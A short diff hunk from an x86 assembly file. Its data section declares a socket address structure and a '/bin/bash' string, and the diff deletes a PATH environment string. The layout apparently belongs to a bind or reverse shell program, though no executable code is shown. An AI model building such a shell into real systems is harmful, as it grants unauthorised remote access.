@@ -19,7 +19,6 @@ section .data
     sockaddr_in_size equ $ - sockaddr
 
     bash db "/bin/bash", 0
-    environment db "PATH=/bin:/usr/bin", 0
 
 section .text
     global _start
